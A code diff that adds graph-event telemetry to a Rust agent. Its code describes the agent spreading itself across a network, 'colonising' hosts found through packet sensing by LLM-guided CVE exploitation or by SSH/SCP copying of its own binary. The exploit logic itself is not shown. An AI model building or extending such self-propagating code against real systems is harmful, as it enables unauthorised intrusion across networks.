@@ -18,6 +18,7 @@
 /// When LLM is not configured (no --llm-endpoint), the agent falls back to
 /// the SSH-propagation path (port-22 probe → SCP/SSH colonisation).
 use crate::{
+    graph_sink::GraphSink,
     lineage::Lineage,
     llm_loop::{self, LlmOutcome},
     propagation::{self, Outcome},
@@ -26,6 +27,7 @@ use crate::{
 };
 use anyhow::Result;
 use physarum_llm::{MockLlmClient, OpenAiCompatibleClient, PolicyGate, PropagationMethodClass};
+use physarum_protocol::EventKind;
 use std::collections::HashSet;
 use std::net::Ipv4Addr;
 use std::path::Path;
@@ -123,7 +125,7 @@ fn parse_cidr(cidr: Option<&str>) -> Option<Vec<(std::net::Ipv4Addr, u8)>> {
     Some(vec![(ip, prefix)])
 }
 
-pub async fn run(mut cli: Cli) -> Result<()> {
+pub async fn run(mut cli: Cli, sink: Option<std::sync::Arc<GraphSink>>) -> Result<()> {
     if matches!(cli.mode, Mode::KeygenTest) {
         return run_keygen_test().await;
     }
@@ -163,6 +165,16 @@ pub async fn run(mut cli: Cli) -> Result<()> {
     let binary_path = std::env::current_exe()?;
     let local_ip = resolve_local_ip(&cli, &lineage);
 
+    // Seed node: always announce self first so the canvas has an anchor
+    // before any discovery events arrive.
+    if let (Some(s), Some(ip)) = (&sink, local_ip) {
+        s.emit(EventKind::NodeDiscovered {
+            ip: ip.to_string(),
+            depth: 0,
+        })
+        .await;
+    }
+
     let mut icmp_rx = crate::icmp::start(cli.interface.clone());
     let mut tcp_rx = crate::tcp::start(cli.interface.clone());
     let mut ebpf_rx: Option<mpsc::Receiver<Ipv4Addr>> = init_ebpf(&cli);
@@ -191,7 +203,7 @@ pub async fn run(mut cli: Cli) -> Result<()> {
                     Some(ip) => {
                         dormant_at = tokio::time::Instant::now() + stimulus_timeout;
                         handle_candidate(
-                            ip, "icmp", &mut lineage, &binary_path, &mut attempted, &llm, &intel, local_ip,
+                            ip, "icmp", &mut lineage, &binary_path, &mut attempted, &llm, &intel, local_ip, sink.as_ref(),
                         ).await?;
                     }
                     None => {
@@ -207,7 +219,7 @@ pub async fn run(mut cli: Cli) -> Result<()> {
                     Some(ip) => {
                         dormant_at = tokio::time::Instant::now() + stimulus_timeout;
                         handle_candidate(
-                            ip, "tcp-syn", &mut lineage, &binary_path, &mut attempted, &llm, &intel, local_ip,
+                            ip, "tcp-syn", &mut lineage, &binary_path, &mut attempted, &llm, &intel, local_ip, sink.as_ref(),
                         ).await?;
                     }
                     None => {
@@ -232,7 +244,7 @@ pub async fn run(mut cli: Cli) -> Result<()> {
                     for ip in candidates {
                         handle_candidate(
                             ip, "startup-sensing", &mut lineage, &binary_path,
-                            &mut attempted, &llm, &intel, local_ip,
+                            &mut attempted, &llm, &intel, local_ip, sink.as_ref(),
                         ).await?;
                     }
                 }
@@ -250,7 +262,7 @@ pub async fn run(mut cli: Cli) -> Result<()> {
                     Some(ip) => {
                         dormant_at = tokio::time::Instant::now() + stimulus_timeout;
                         handle_candidate(
-                            ip, "ebpf", &mut lineage, &binary_path, &mut attempted, &llm, &intel, local_ip,
+                            ip, "ebpf", &mut lineage, &binary_path, &mut attempted, &llm, &intel, local_ip, sink.as_ref(),
                         ).await?;
                     }
                     None => {
@@ -303,6 +315,7 @@ async fn handle_candidate(
     llm: &Option<LlmConfig>,
     intel: &VulnerabilityIntelService,
     local_ip: Option<Ipv4Addr>,
+    sink: Option<&std::sync::Arc<GraphSink>>,
 ) -> Result<()> {
     let ip_str = src_ip.to_string();
 
@@ -336,6 +349,21 @@ async fn handle_candidate(
 
     tracing::info!(%src_ip, stimulus, "candidate accepted — starting evidence pipeline");
 
+    // Capture parent before llm_loop::run() mutates lineage via extend()
+    let parent_ip = lineage
+        .path
+        .last()
+        .cloned()
+        .unwrap_or_else(|| lineage.origin.clone());
+
+    if let Some(s) = sink {
+        s.emit(EventKind::NodeDiscovered {
+            ip: ip_str.clone(),
+            depth: lineage.hops as u32 + 1,
+        })
+        .await;
+    }
+
     // ── Path A: LLM reasoning (all stimuli when LLM is configured) ────────
     if let Some(cfg) = llm {
         match llm_loop::run(
@@ -349,8 +377,22 @@ async fn handle_candidate(
         )
         .await?
         {
-            LlmOutcome::Propagated => {
+            LlmOutcome::Propagated { confidence, cve } => {
                 tracing::info!(%src_ip, "LLM propagation succeeded");
+                if let Some(s) = sink {
+                    s.emit(EventKind::EdgeAdded {
+                        from: parent_ip.clone(),
+                        to: ip_str.clone(),
+                    })
+                    .await;
+                    s.emit(EventKind::NodeColonized {
+                        ip: ip_str.clone(),
+                        depth: lineage.hops as u32 + 1,
+                        confidence,
+                        cve,
+                    })
+                    .await;
+                }
                 lineage.mark_colonized(&ip_str);
                 lineage.save()?;
                 return Ok(());
@@ -383,6 +425,25 @@ async fn handle_candidate(
     match propagation::propagate(src_ip, binary_path, &next_b64).await? {
         Outcome::Success => {
             tracing::info!(%src_ip, hops = next_lineage.hops, "propagation success");
+            if let Some(s) = sink {
+                let from = lineage
+                    .path
+                    .last()
+                    .cloned()
+                    .unwrap_or_else(|| lineage.origin.clone());
+                s.emit(EventKind::EdgeAdded {
+                    from: from.clone(),
+                    to: ip_str.clone(),
+                })
+                .await;
+                s.emit(EventKind::NodeColonized {
+                    ip: ip_str.clone(),
+                    depth: next_lineage.hops as u32,
+                    confidence: 0.0,
+                    cve: None,
+                })
+                .await;
+            }
             *lineage = next_lineage;
             lineage.save()?;
         }
@@ -393,6 +454,13 @@ async fn handle_candidate(
                 .last()
                 .cloned()
                 .unwrap_or_else(|| lineage.origin.clone());
+            if let Some(s) = sink {
+                s.emit(EventKind::EdgeAdded {
+                    from: from.clone(),
+                    to: ip_str.clone(),
+                })
+                .await;
+            }
             lineage.mark_colonized(&ip_str);
             lineage.add_secondary_conduit(&from, &ip_str);
             lineage.save()?;
